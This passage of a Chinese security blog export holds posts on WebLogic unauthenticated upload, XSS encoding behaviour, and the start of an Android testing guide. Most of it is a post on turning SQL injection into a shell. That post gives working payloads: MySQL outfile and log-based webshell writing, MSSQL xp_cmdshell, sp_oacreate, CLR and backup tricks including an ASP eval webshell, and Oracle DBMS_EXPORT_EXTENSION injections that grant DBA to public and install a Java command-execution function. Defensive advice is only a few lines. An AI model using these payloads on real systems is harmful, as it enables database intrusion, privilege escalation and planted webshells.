href=\"#WebLogic远程部署\" class=\"headerlink\" title=\"WebLogic远程部署\"></a>WebLogic远程部署</h3><p><a href=\"http://ip/console部署war\" target=\"_blank\" rel=\"noopener\">http://ip/console部署war</a></p>\n<h3 id=\"任意文件上传\"><a href=\"#任意文件上传\" class=\"headerlink\" title=\"任意文件上传\"></a>任意文件上传</h3><p>版本：10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3</p>\n<p>非常神奇难以理解的漏洞，直接开放未授权便可上传的页面</p>\n<p>访问<a href=\"http://127.0.0.1:7001/ws_utc/config.do，http://127.0.0.1:7001/ws_utc/begin.do可直接上传。\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:7001/ws_utc/config.do，http://127.0.0.1:7001/ws_utc/begin.do可直接上传。</a></p>\n<h3 id=\"weblogic一把梭\"><a href=\"#weblogic一把梭\" class=\"headerlink\" title=\"weblogic一把梭\"></a>weblogic一把梭</h3><p><a href=\"https://github.com/rabbitmask/WeblogicScan\" target=\"_blank\" rel=\"noopener\">工具</a></p>\n","categories":[],"tags":[]},{"title":"sql屠龙术","url":"http://yoursite.com/2019/08/29/sql注入获得shell/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>最近在工作中遇到一次sql注入想要使用这个sql注入来获得shell时发现自己对这些常规数据库一些安全方面的知识并不熟悉便决定专门了解一下。</p>\n<p>当然作为新手我总结的方式肯定不全面，在以后的学习工作中我遇到新的方式会添加进来。</p>\n<h1 id=\"MySql\"><a href=\"#MySql\" class=\"headerlink\" title=\"MySql\"></a>MySql</h1><h2 id=\"权限\"><a href=\"#权限\" class=\"headerlink\" title=\"权限\"></a>权限</h2><p>mysql在安装完成之后只有一个root用户，mysql需要自己创建具有不同权限的账户。</p>\n<p>表权限:’Select’, ‘Insert’, ‘Update’, ‘Delete’, ‘Create’, ‘Drop’, ‘Grant’, ‘References’, ‘Index’, ‘Alter’;</p>\n<p>列权限:’Select’, ‘Insert’, ‘Update’, ‘References’;</p>\n<p>过程权限:’Execute’, ‘Alter Routine’, ‘Grant’;</p>\n<p>表和列权限不用多说，过程权限指的是存储过程的权限，存储过程可以理解为编程语言的函数。</p>\n<h2 id=\"getshell方法总结\"><a href=\"#getshell方法总结\" class=\"headerlink\" title=\"getshell方法总结\"></a>getshell方法总结</h2><h3 id=\"select-…-into-outfile方法\"><a href=\"#select-…-into-outfile方法\" class=\"headerlink\" title=\"select … into outfile方法\"></a>select … into outfile方法</h3><p><strong>条件</strong></p>\n<p>数据库对对web目录有写权限。</p>\n<p>GPC关闭。</p>\n<p>有绝对路径。</p>\n<p>没有配置secure-file-priv。</p>\n<p><strong>实现步骤及原理</strong></p>\n<p>数据库是一个软件，软件的权限决定于启动者，启动者的系统权限高数据库的权限就高(这也不一定，oracle有自己创建的系统账号我暂时没研究过oracle这种执行一个命令使用的是什么账号的权限)，以下做一个验证。</p>\n<p><img src=\"/2019/08/29/sql注入获得shell/1567151247852.png\" alt=\"1567151247852\"></p>\n<p>上图是我使用非root运行数据库后使用apt-get，下图是我使用root启动再使用apt-get。</p>\n<p><img src=\"/2019/08/29/sql注入获得shell/1567151261135.png\" alt=\"1567151261135\"></p>\n<p>可以验证刚才的说法。</p>\n<p>secure-file-priv是mysql的一个限制导入导出的参数为NULL禁止导入、导出，值为目录为导入导出的路径，为空则不限制导入导出。</p>\n<p>union或者堆查询</p>\n<p><code>select &#39;内容&#39; into outfile &#39;路径&#39;;</code></p>\n<p>如果不能union可以使用</p>\n<p><code>into outfile &#39;路径&#39; fields terminated by &#39;代码&#39;;</code>terminated by是将后面的代码当分隔符插入进去</p>\n<h3 id=\"日志获得shell\"><a href=\"#日志获得shell\" class=\"headerlink\" title=\"日志获得shell\"></a>日志获得shell</h3><p>以general_log为例子。</p>\n<p><strong>条件</strong></p>\n<p>对web目录有写权限</p>\n<p>GPC关闭(GPC:是否对单引号转义)</p>\n<p>有绝对路径(读文件可以不用，写文件需要)</p>\n<p>需要能执行多行SQL语句</p>\n<p><strong>实现步骤及原理</strong></p>\n<p>show global variables like “%genera%”;查看开启的情况。</p>\n<p>set global general_log = on;打开general_log功能。</p>\n<p>set global general_log_file = ‘路径’;设置记录存储路径。</p>\n<p>select ‘代码’;写入代码。</p>\n<p><strong>mysql中慢查询日志也可以使用此方法来写入shell，错误日志与二进制日志目录都是需要修改mysql配置文件实现意义较低慢查询可以参考如下</strong><a href=\"https://www.cnblogs.com/c1e4r/articles/8902444.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/c1e4r/articles/8902444.html</a></p>\n<h2 id=\"防御方法\"><a href=\"#防御方法\" class=\"headerlink\" title=\"防御方法\"></a>防御方法</h2><p>secure_file_prive = null。</p>\n<p>正确设置 web 目录权限，除 log、upload 等目录外不授予写权限，upload 目录不授予执行权限。</p>\n<h1 id=\"SqlServer\"><a href=\"#SqlServer\" class=\"headerlink\" title=\"SqlServer\"></a>SqlServer</h1><h2 id=\"执行命令\"><a href=\"#执行命令\" class=\"headerlink\" title=\"执行命令\"></a>执行命令</h2><h3 id=\"xp-cmdshell\"><a href=\"#xp-cmdshell\" class=\"headerlink\" title=\"xp_cmdshell\"></a>xp_cmdshell</h3><p>xp_cmdshell是mssql的存储过程，可以直接执行命令。</p>\n<p><code>EXEC master.dbo.xp_cmdshell &#39;cmd&#39;;</code></p>\n<p><strong>mssql2005版本默认禁止。</strong></p>\n<p>激活xp_cmdshell。</p>\n<p><code>EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;</code></p>\n<p>安装xp_cmdshell。</p>\n<p><code>EXEC sp_addextendedproc xp_cmdshell,@dllname =&#39;xplog70.dll&#39;declare @o int</code></p>\n<p><code>sp_addextendedproc &#39;xp_cmdshell&#39;,&#39;xpsql70.dll&#39;</code></p>\n<h3 id=\"SP-OACREATE\"><a href=\"#SP-OACREATE\" class=\"headerlink\" title=\"SP_OACREATE\"></a>SP_OACREATE</h3><p><strong>MSSQL 2005及以上版本中默认是禁用的</strong></p>\n<p>写入shell</p>\n<p><code>declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\\windows\\system32\\cmd.exe /c whoami &gt;d:\\\\temp\\\\1.txt&#39;</code></p>\n<p>该方式无回显，使用外带或写在文件中。</p>\n<p>激活sp_oacreate。</p>\n<p><code>exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec sp_configure &#39;Ole Automation Procedures&#39;,1;RECONFIGURE;</code></p>\n<h3 id=\"jet沙盒\"><a href=\"#jet沙盒\" class=\"headerlink\" title=\"jet沙盒\"></a>jet沙盒</h3><p>运行命令</p>\n<p>select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database=c:\\windows\\system32\\ias\\ias.mdb’,’select shell(“CMD命令”)’)</p>\n<p><strong>激活沙盒</strong></p>\n<p><strong>SQL Server2008 默认未注册microsoft.jet.oledb.4.0接口,所以无法利用沙盒模式执行系统命令.</strong></p>\n<p>exec master..xp_regwrite’HKEY_LOCAL_MACHINE’,’SOFTWARE\\Wow6432Node\\Microsoft\\Jet\\4.0\\Engines’ ,’SandBoxMode’,’REG_DWORD’,0; </p>\n<h3 id=\"CLR执行\"><a href=\"#CLR执行\" class=\"headerlink\" title=\"CLR执行\"></a>CLR执行</h3><p>MsSql使用CLR存储过程，CLR是一个类似JAVA虚拟机的环境，Mssql2005后可以调用CLR过程来加载一些函数。</p>\n<p><strong>第一步</strong></p>\n<p>编写代码编译成DLL文件，<a href=\"https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&mid=2247486636&idx=1&sn=e2f7129ebcebd78da0eeee8335e60f02&chksm=fbf796dccc801fca48b0416eebe1ae148627b8494066ed0b1a21c79e018d5fdde1c2b4073d9e&mpshare=1&scene=1&srcid=&sharer_sharetime=1568272683635&sharer_shareid=4056c5892d236b283f567b1bbeab207a&key=a60e3d263d5f7c346acefd6d558d7098acd6a4e15450bd7ba67fb5b8d20d7ab326ab681201da6c3585d60e60120492bc85fa327ae0b158906ed944b2e7bb614807f3f927ac9af8c912034b96c7ee9cd6&ascene=1&uin=MTIzNDgwNjQyOA%3D%3D&devicetype=Windows+10&version=62060833&lang=zh_CN&pass_ticket=4gFD0qvuaW0pXomdJxD%2FQ2W1pyl8z2q5eY1yK%2FV%2Fkubb68FUSzjg8WosecoCwQ2v\" target=\"_blank\" rel=\"noopener\">代码参考</a></p>\n<p><strong>第二步</strong></p>\n<p>开启CLR</p>\n<p>sp_configure ‘clr enabled’,1;RECONFIGURE;GO</p>\n<p><strong>第三步</strong></p>\n<p>创建存储过程</p>\n<p>– 装载DLL文件</p>\n<p>CREATE ASSEMBLY my_assembly FROM ‘c:\\temp\\cmd_exec.dll’;WITH PERMISSION_SET = UNSAFE;Go</p>\n<p>– 链接</p>\n<p>CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];GO</p>\n<p>cmd_exec ‘cmd’执行命令。</p>\n<p><strong>如果遇到权限问题请执行</strong></p>\n<p> alter database [数据库名] set TRUSTWORTHY on EXEC sp_changedbowner ‘sa’</p>\n<h2 id=\"备份法\"><a href=\"#备份法\" class=\"headerlink\" title=\"备份法\"></a>备份法</h2><h3 id=\"差异备份\"><a href=\"#差异备份\" class=\"headerlink\" title=\"差异备份\"></a>差异备份</h3><p>差异备份法webshell过大。</p>\n<p><code>backup database 库名 to disk = &#39;路径&#39;;\ncreate table [dbo].[test_tmp] ([cmd] [image]);\ninsert into  test_tmp(cmd) values(&#39;webshell&#39;);\nbackup database 库名 to disk=&#39;路径&#39; WITH DIFFERENTIAL,FORMAT;</code></p>\n<h3 id=\"sp-makewebtask备份\"><a href=\"#sp-makewebtask备份\" class=\"headerlink\" title=\"sp_makewebtask备份\"></a>sp_makewebtask备份</h3><p><code>exec sp_makewebtask &#39;c:\\shell.asp&#39;,&#39; select &#39;&#39;&lt;%25execute(request(&quot;a&quot;))%25&gt;&#39;&#39; &#39;;</code></p>\n<p>默认2005禁止，激活存储过程。</p>\n<p><code>exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec sp_configure &#39;Web Assistant Procedures&#39;,1;RECONFIGURE;</code></p>\n<h3 id=\"log备份法\"><a href=\"#log备份法\" class=\"headerlink\" title=\"log备份法\"></a>log备份法</h3><p>相对差异备份法shell就很小。</p>\n<p>第一步<code>alter database asp_test set RECOVERY FULL</code>激活mssql为还原模式。</p>\n<p>其他后面步骤一样。</p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&mid=2247486636&idx=1&sn=e2f7129ebcebd78da0eeee8335e60f02&chksm=fbf796dccc801fca48b0416eebe1ae148627b8494066ed0b1a21c79e018d5fdde1c2b4073d9e&mpshare=1&scene=1&srcid=&sharer_sharetime=1568272683635&sharer_shareid=4056c5892d236b283f567b1bbeab207a&key=a60e3d263d5f7c346acefd6d558d7098acd6a4e15450bd7ba67fb5b8d20d7ab326ab681201da6c3585d60e60120492bc85fa327ae0b158906ed944b2e7bb614807f3f927ac9af8c912034b96c7ee9cd6&ascene=1&uin=MTIzNDgwNjQyOA%3D%3D&devicetype=Windows+10&version=62060833&lang=zh_CN&pass_ticket=4gFD0qvuaW0pXomdJxD%2FQ2W1pyl8z2q5eY1yK%2FV%2Fkubb68FUSzjg8WosecoCwQ2v\" target=\"_blank\" rel=\"noopener\">安恒一篇关于mssql利用的总结</a></p>\n<h1 id=\"oracle\"><a href=\"#oracle\" class=\"headerlink\" title=\"oracle\"></a>oracle</h1><p>oracle是一个庞大的数据库，普遍用于大公司，oracle也十分繁琐。</p>\n<p>oracle系统库默认的用户有sys,system,internal,scott,前三个权限都是system权限，</p>\n<p>在 Oracle 的存储过程中，有一个有趣的特点：运行权限。运行权限分为两种，definer 和 invoker。definer 为函数创建者的权限，而 invoker 则是当前调用函数的用户。运行权限在函数创建时就已经被钦定了，<strong>默认definer</strong>。</p>\n<p>由于这种特性我们就有了很多操作空间了。</p>\n<p><strong>oracle不同于mysql，oracle注入一定要带上表名，如果没有可以使用虚表dual。</strong></p>\n<p>数据库中任何一个用户都默认拥有 public 角色，我们对pulic角色操作就能很方便的对自己角色操作。</p>\n<h2 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h2><p>这里我也没怎么遇到过oracle数据库经验不足，这些都是看<a href=\"https://redn3ck.github.io/2018/04/25/Oracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9/\" target=\"_blank\" rel=\"noopener\">别人博客</a>边看边抄来的，暂时没时间研究，好久自己搭环境研究下如果有错再来修改。</p>\n<h3 id=\"GET-DOMAIN-INDEX-TABLES\"><a href=\"#GET-DOMAIN-INDEX-TABLES\" class=\"headerlink\" title=\"GET_DOMAIN_INDEX_TABLES\"></a>GET_DOMAIN_INDEX_TABLES</h3><p>在10g中GET_DOMAIN_INDEX_TABLES 函数存在注入漏洞，该函数位于 DBMS_EXPORT_EXTENSION 包中，执行权限隶属于 sys。</p>\n<p><strong>版本：</strong></p>\n<p><strong>Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)</strong></p>\n<p>这个类似于CLR执行需要加载Java包，里面创建执行命令函数。具体怎么编写java也不是很懂，这里抄的大佬的代码</p>\n<p><strong>提权到dba角色。</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&apos;FOO&apos;,&apos;BAR&apos;,&apos;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &apos;&apos;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &apos;&apos;&apos;&apos;grant dba to public&apos;&apos;&apos;&apos;;END;&apos;&apos;;END;--&apos;,&apos;SYS&apos;,0,&apos;1&apos;,0) from dual</span><br></pre></td></tr></table></figure>\n\n<p><strong>创建JAVA库</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&apos;FOO&apos;,&apos;BAR&apos;,&apos;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &apos;&apos;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &apos;&apos;&apos;&apos;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args)&#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;public static String readFile(String filename)&#123;try&#123;BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&apos;&apos;&apos;&apos;;END;&apos;&apos;;END;--&apos;,&apos;SYS&apos;,0,&apos;1&apos;,0) from dual</span><br></pre></td></tr></table></figure>\n\n<p><strong>赋予java权限</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&apos;FOO&apos;,&apos;BAR&apos;,&apos;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &apos;&apos;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &apos;&apos;&apos;&apos;begin dbms_java.grant_permission(&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;PUBLIC&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;, &apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;SYS:java.io.FilePermission&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;,&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&lt;&gt;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;, &apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;execute&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;);end;&apos;&apos;&apos;&apos;;END;&apos;&apos;;END;--&apos;,&apos;SYS&apos;,0,&apos;1&apos;,0) from dual</span><br></pre></td></tr></table></figure>\n\n<p><strong>创建函数</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&apos;FOO&apos;,&apos;BAR&apos;,&apos;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &apos;&apos;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &apos;&apos;&apos;&apos;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;LinxUtil.runCMD(java.lang.String) return String&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;;&apos;&apos;&apos;&apos;;END;&apos;&apos;;END;--&apos;,&apos;SYS&apos;,0,&apos;1&apos;,0) from dual</span><br></pre></td></tr></table></figure>\n\n<p><strong>赋予函数执行权限</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&apos;FOO&apos;,&apos;BAR&apos;,&apos;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &apos;&apos;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &apos;&apos;&apos;&apos;grant all on LinxRunCMD to public&apos;&apos;&apos;&apos;;END;&apos;&apos;;END;--&apos;,&apos;SYS&apos;,0,&apos;1&apos;,0) from dual</span><br></pre></td></tr></table></figure>\n\n<p><strong>执行</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select sys.LinxRunCMD(&apos;/bin/bash -c /usr/bin/whoami&apos;) from dual</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"dbms-xmlquery-newcontext\"><a href=\"#dbms-xmlquery-newcontext\" class=\"headerlink\" title=\"dbms_xmlquery.newcontext\"></a>dbms_xmlquery.newcontext</h3><p>这里也需要DBMS_EXPORT_EXTENSION存在漏洞情况下，否则赋予权限时无法成功</p>\n<p><strong>版本：</strong></p>\n<p>Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)</p>\n<p><strong>创建java包</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select dbms_xmlquery.newcontext(&apos;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &apos;&apos;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&apos;&apos;;commit;end;&apos;) from dual;</span><br></pre></td></tr></table></figure>\n\n<p><strong>赋予java权限</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&apos;FOO&apos;,&apos;BAR&apos;,&apos;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &apos;&apos;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &apos;&apos;&apos;&apos;begin dbms_java.grant_permission(&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;YY&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;, &apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;SYS:java.io.FilePermission&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;,&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&lt;&lt;ALL FILES&gt;&gt;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;, &apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;execute&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;);end;&apos;&apos;&apos;&apos;;END;&apos;&apos;;END;--&apos;,&apos;SYS&apos;,0,&apos;1&apos;,0) from dual;</span><br></pre></td></tr></table></figure>\n\n<p><strong>创建函数</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select dbms_xmlquery.newcontext(&apos;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &apos;&apos;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &apos;&apos;&apos;&apos;LinxUtil.runCMD(java.lang.String) return String&apos;&apos;&apos;&apos;; &apos;&apos;;commit;end;&apos;) from dual;</span><br></pre></td></tr></table></figure>\n\n<p><strong>执行命令</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select LinxRunCMD(&apos;id&apos;) from dual</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"DBMS-JAVA-TEST-FUNCALL\"><a href=\"#DBMS-JAVA-TEST-FUNCALL\" class=\"headerlink\" title=\"DBMS_JAVA_TEST.FUNCALL\"></a>DBMS_JAVA_TEST.FUNCALL</h3><p><strong>版本：</strong></p>\n<p>10g R2, 11g R1, 11g R2</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (Select DBMS_JAVA_TEST.FUNCALL (‘oracle/aurora/util/Wrapper’,&apos;main’,&apos;c:\\\\windows\\\\system32\\\\cmd.exe’,&apos;/c’,&apos;dir&gt;c:\\\\OUT2.LST’) FROM DUAL)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"DBMS-JAVA-RUNJAV\"><a href=\"#DBMS-JAVA-RUNJAV\" class=\"headerlink\" title=\"DBMS_JAVA.RUNJAV\"></a>DBMS_JAVA.RUNJAV</h3><p><strong>版本：</strong></p>\n<p>11gR1,11gR2</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (SELECT DBMS_JAVA.RUNJAVA (‘oracle/aurora/util/Wrapper c:\\\\windows\\\\system32\\\\cmd.exe /c dir&gt;C:\\\\OUT.LST’) FROM DUAL)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://www.4hou.com/technology/3338.html\" target=\"_blank\" rel=\"noopener\">https://www.4hou.com/technology/3338.html</a></p>\n<p><a href=\"https://www.cnblogs.com/R4v3n/articles/9072549.html#menu_index_7\" target=\"_blank\" rel=\"noopener\">mssql执行命令大全</a></p>\n","categories":[],"tags":[]},{"title":"xss研究之浏览器编码探究","url":"http://yoursite.com/2019/08/15/xss研究之浏览器编码探究/","content":"<p><strong>以下是根据网上文章字节理解整理的一篇文章，可能存在错误，&lt;__&gt;有错你也打不到我</strong></p>\n<h1 id=\"浏览器解码规则\"><a href=\"#浏览器解码规则\" class=\"headerlink\" title=\"浏览器解码规则\"></a>浏览器解码规则</h1><p><img src=\"/2019/08/15/xss研究之浏览器编码探究/1565924892380.png\" alt=\"图1\"></p>\n<p>说到浏览器规则便用这一张图来简单阐述。</p>\n<p>首先生成html和css的DOM树和CSSOM树，当遇到script时会中断DOM树的创建。了解浏览器渲染流程可以参考链接<a href=\"http://bobao.360.cn/learning/detail/292.html\" target=\"_blank\" rel=\"noopener\">html渲染</a>。</p>\n<h1 id=\"html解析器\"><a href=\"#html解析器\" class=\"headerlink\" title=\"html解析器\"></a>html解析器</h1><p>html渲染生成DOM树时&lt;且后面无/就进入”标签开始状态“，然后匹配到标签转变到“标签名状态”，“前属性名状态(before attribute name state)”……最后进入“数据状态(Data state)”并释放当前标签的token。当解析器处于“数据状态(Data state)”时，它会继续解析，每当发现一个完整的标签也就是匹配到“&gt;”，就会释放出一个token。</p>\n<p>也就是说我们是不能使用<code>&amp;#60;&amp;#62;</code>(&lt;&gt;)这样的实体来标识一个html标签这是不会被执行的，因为解析<code>&amp;#60;&amp;#62;</code>并不会进入标签开始状态，我们无法使用标签名的实体来绕过过滤，实际上标签名不能进行任何编码。</p>\n<h1 id=\"js解析器\"><a href=\"#js解析器\" class=\"headerlink\" title=\"js解析器\"></a>js解析器</h1><p>js编码是使用<code>\\uXXXX</code>这种写法为<code>Unicode</code>转义序列。js触发有<code>script</code>、on*时间和伪协议。</p>\n<h2 id=\"script\"><a href=\"#script\" class=\"headerlink\" title=\"script\"></a>script</h2><p><strong>script有个有趣的属性在块中的字符引用实体不会被解析和解码</strong>，也就是说<code>script</code>标签中不能使用实体编码来编码函数等。但能处理js编码但js编码不能编码引号等字符因为这样便无法执行xss。</p>\n<h2 id=\"on-事件\"><a href=\"#on-事件\" class=\"headerlink\" title=\"on*事件\"></a>on*事件</h2><p>思考两行代码<code>&lt;img src=1 onerror=ale\\u0072t(1)&gt;</code>和<code>&lt;img src=1 oner\\u0072or=alert(1)&gt;</code>两行代码</p>\n<p>会发现第一个代码弹框第二个代码未弹框,这是因为浏览器在处理到<code>onerror</code>时便调用js解析器但对于<code>oner\\u0072or</code>浏览器并不会调用js解析器，我们无法对onerror事件编码，因为这样html解析器不认识这个onerror事件就不会将他交给js解析器，浏览器在调用on事件时其实调用的对应on函数,具体处理可以看大佬调试ie的<a href=\"https://xz.aliyun.com/t/1556\" target=\"_blank\" rel=\"noopener\">文章</a></p>\n<h2 id=\"伪协议\"><a href=\"#伪协议\" class=\"headerlink\" title=\"伪协议\"></a>伪协议</h2><p><img src=\"/2019/08/15/xss研究之浏览器编码探究/1565935108396.png\" alt=\"1565935108396\"></p>\n<p>上面的代码放到浏览器能弹框，为什么对javascript进行实体还能弹框呢？首先浏览器对代码进行html解码</p>\n<p><img src=\"/2019/08/15/xss研究之浏览器编码探究/1565935142519.png\" alt=\"1565935142519\"></p>\n<p>之后这里多了一层调用url解析器,url解析器去识别了javascript伪协议，<strong>注意url解析不能识别任何编码后的协议类型</strong>这里是由于html解码发生在url解析前所以才能解析。最后url解析器解析了</p>\n<p>%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30</p>\n<p>%30%37%32%5c%75%30%30%37%34</p>\n<p>再由js解析器解析。</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>对于html标签属性进行了编码便不会被识别。</p>\n<p>&#60;script&#62;标签不能使用js编码外的其他js解释器不识别的编码，script标签中的内容会原封不动的给js去执行。</p>\n<p>on*事件是调用的js函数，html编码处理发生在给JS解析器之前。</p>\n<p>伪协议能对url和html解析，实体和URL编码的处理发生在交给js解析器之前。</p>\n<h2 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h2><p><a href=\"https://security.yirendai.com/news/share/26\" target=\"_blank\" rel=\"noopener\">https://security.yirendai.com/news/share/26</a></p>\n<p><a href=\"https://xz.aliyun.com/t/1556\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/1556</a></p>\n<p><a href=\"https://www.yuque.com/kkdlong/eiwne5/fpl8ob?language=en-us\" target=\"_blank\" rel=\"noopener\">https://www.yuque.com/kkdlong/eiwne5/fpl8ob?language=en-us</a></p>\n","categories":[],"tags":["xss","编码"]},{"title":"安卓基础检测","url":"http://yoursite.com/2018/03/02/安卓反编译与打包/","content":"<h2 id=\"工具、环境准备\"><a href=\"#工具、环境准备\" class=\"headerlink\" title=\"工具、环境准备\"></a>工具、环境准备</h2><p>1.java环境安装  </p>\n<p>2.apktool</p>\n<p>3.drozer安装，<a href=\"https://www.cnblogs.com/lsdb/p/9441813.html\" target=\"_blank\" rel=\"noopener\">安装教程</a></p>\n<h2 id=\"反编译与打包\"><a href=\"#反编译与打包\" class=\"headerlink\" 